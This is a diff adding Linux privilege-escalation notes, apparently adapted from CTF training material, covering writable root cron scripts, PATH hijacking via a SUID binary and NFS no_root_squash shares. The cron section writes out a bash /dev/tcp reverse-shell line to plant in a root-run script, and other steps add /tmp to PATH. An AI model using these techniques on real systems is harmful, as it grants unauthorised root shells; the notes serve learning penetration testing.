@@ -52,6 +52,9 @@ Hacking linux
   - [Privilege Escalation Sudo](#Privilege-Escalation-Sudo)
   - [Privilege Escalation SUID](#Privilege-Escalation-SUID)
   - [Privilege Escalation Capabilities](#Privilege-Escalation-Capabilities)
+  - [Privilege Escalation Cron Jobs](#Privilege-Escalation-Cron-Jobs)
+  - [Privilege Escalation PATH](#Privilege-Escalation-PATH)
+  - [Privilege Escalation NFS](#Privilege-Escalation-NFS)
 - [Linux Privilige Escalation 2](#Linux-Privilige-Escalation-2)
   - [Kernel Exploits](#Kernel-Exploits)
   - [Stored Passwords (Config Files)](#Stored-Passwords-Config-Files)
@@ -880,6 +883,183 @@ This will launch a root shell as seen below;
 
 ![image](https://user-images.githubusercontent.com/24814781/197636621-b02a3962-5e1f-4421-9bac-97238c422d0c.png)
 
+
+### Privilege Escalation Cron Jobs
+
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
+
+Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.
+
+Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.
+
+Any user can read the file keeping system-wide cron jobs under /etc/crontab
+
+While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.
+
+![image](https://user-images.githubusercontent.com/24814781/197877239-b7960457-1bf5-48a8-ad6e-d903afbf5916.png)
+
+You can see the backup.sh script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.
+
+![image](https://user-images.githubusercontent.com/24814781/197877262-6d53d978-1d7b-41e8-9342-3b3018f66cc0.png)
+
+
+As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.
+
+The script will use the tools available on the target system to launch a reverse shell.
+Two points to note;
+
+1.    The command syntax will vary depending on the available tools. (e.g. nc will probably not support the -e option you may have seen used in other cases)
+2.    We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
+
+The file should look like this;
+![image](https://user-images.githubusercontent.com/24814781/197877309-e9b2de83-3e2a-4942-a336-d61be3d55471.png)
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+``` 
+
+ We will now run a listener on our attacking machine to receive the incoming connection.
+ 
+ ![image](https://user-images.githubusercontent.com/24814781/197877347-950e9e31-1781-40e8-9e04-91aee0aa59b6.png)
+
+Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
+
+1.    System administrators need to run a script at regular intervals.
+2.    They create a cron job to do this
+3.    After a while, the script becomes useless, and they delete it
+4.    They do not clean the relevant cron job
+
+This change management issue leads to a potential exploit leveraging cron jobs.
+
+![image](https://user-images.githubusercontent.com/24814781/197877427-e4d31f7d-6680-47fc-b0ce-2a4ad7d80bab.png)
+
+The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
+If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.
+
+
+The file on the target system should look familiar: 
+![image](https://user-images.githubusercontent.com/24814781/197877467-408c913e-9e23-472b-bad7-ce6347d1ad74.png)
+
+The incoming reverse shell connection has root privileges:
+![image](https://user-images.githubusercontent.com/24814781/197877484-80f7f2df-6ec1-47e5-9e41-a6b1fc5f6fff.png)
+
+In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.
+
+### Privilege Escalation: PATH
+
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).
+
+Typically the PATH will look like this:
+
+![image](https://user-images.githubusercontent.com/24814781/197884248-315c882a-8f4b-417f-8cc4-b2f640e90c8a.png)
+
+If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
+
+1.    What folders are located under $PATH
+2.    Does your current user have write privileges for any of these folders?
+3.    Can you modify $PATH?
+4.    Is there a script/application you can start that will be affected by this vulnerability?
+
+For demo purposes, we will use the script below:
+
+![image](https://user-images.githubusercontent.com/24814781/197884286-0498408e-f4b5-468d-bd97-2baa1da417d1.png)
+
+ This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.
+
+
+We compile this into an executable and set the SUID bit. 
+
+![image](https://user-images.githubusercontent.com/24814781/197884318-f6ffcd08-2a42-4188-b83e-b604e7ceba65.png)
+
+ Our user now has access to the “path” script with SUID bit set.
+ 
+ ![image](https://user-images.githubusercontent.com/24814781/197884345-6710050c-a4ec-4b17-a901-699339cccc41.png)
+
+ Once executed “path” will look for an executable named “thm” inside folders listed under PATH.
+
+
+If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege
+
+
+
+A simple search for writable folders can done using the “find / -writable 2>/dev/null” command. The output of this command can be cleaned using a simple cut and sort sequence.
+
+![image](https://user-images.githubusercontent.com/24814781/197884380-b7fe5a0a-3ddd-45a5-8737-b4cee3a49286.png)
+
+ Some CTF scenarios can present different folders but a regular system would output something like we see above.
+
+Comparing this with PATH will help us find folders we could use. 
+
+![image](https://user-images.githubusercontent.com/24814781/197884418-6d87db29-c5b7-4371-a976-920d49dacfcc.png)
+
+We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders. 
+
+![image](https://user-images.githubusercontent.com/24814781/197884433-4729b5da-d30d-4bba-8043-cd9ac1cf8aaf.png)
+
+
+ An alternative could be the command below.
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+``` 
+We have added “grep -v proc” to get rid of the many results related to running processes.
+
+
+Unfortunately, subfolders under /usr are not writable
+
+
+The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the 
+```
+export PATH=/tmp:$PATH
+```
+command accomplishes this. 
+
+![image](https://user-images.githubusercontent.com/24814781/197884472-c5c5a49a-a0ad-400b-b51b-ab7dd72237f1.png)
+
+ At this point the path script will also look under the /tmp folder for an executable named “thm”.
+
+Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.
+
+![image](https://user-images.githubusercontent.com/24814781/197884487-66a14a2d-b0f7-42d2-b837-eb7094759c6a.png)
+
+We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges. 
+
+![image](https://user-images.githubusercontent.com/24814781/197884528-1afab975-c194-44ee-be57-cf1099934417.png)
+
+### Privilege Escalation NFS
+
+Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.
+
+Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.
+
+NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+
+![image](https://user-images.githubusercontent.com/24814781/197888908-85b81714-1c11-4f6e-bb5d-6711ca3c3e50.png)
+
+The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+We will start by enumerating mountable shares from our attacking machine.
+
+![image](https://user-images.githubusercontent.com/24814781/197888942-3e688b88-6e32-40d1-bace-e0017ff22fb5.png)
+
+ We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable. 
+
+![image](https://user-images.githubusercontent.com/24814781/197888965-83192aed-413f-4d41-b377-adaff29db23d.png)
+
+ As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job. 
+ 
+ ![image](https://user-images.githubusercontent.com/24814781/197888984-f3a46a5d-d40c-4a14-b4b1-9ada8a0e75f0.png)
+
+ Once we compile the code we will set the SUID bit.
+ 
+ ![image](https://user-images.githubusercontent.com/24814781/197889011-f6e49a1b-611c-44dd-941f-72aef26f8f7a.png)
+
+ You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them). 
+ 
+ ![image](https://user-images.githubusercontent.com/24814781/197889028-3558b912-c219-4b61-844f-9425753fe4c4.png)
+
+ Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
